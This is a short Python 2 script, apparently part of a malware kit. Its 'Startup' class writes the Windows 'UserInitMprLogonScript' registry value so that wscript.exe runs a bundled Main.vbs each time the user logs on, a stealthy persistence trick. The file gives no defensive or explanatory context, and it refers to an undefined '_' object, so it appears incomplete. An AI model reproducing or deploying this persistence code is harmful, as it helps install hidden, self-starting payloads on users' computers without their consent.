import os
from _winreg import *
class Startup():
	def __init__(self):
		self.__file__ = _.__file__
		self.Main()

	def Main(self):
		dirname = "\\".join(os.path.abspath(self.__file__).split("\\")[:-1])
		root_key=OpenKey(HKEY_CURRENT_USER, r'Environment', 0, KEY_WRITE)
		SetValueEx(root_key,"UserInitMprLogonScript",0,REG_SZ,"wscript.exe " + dirname + "\\Main.vbs")
		CloseKey(root_key)
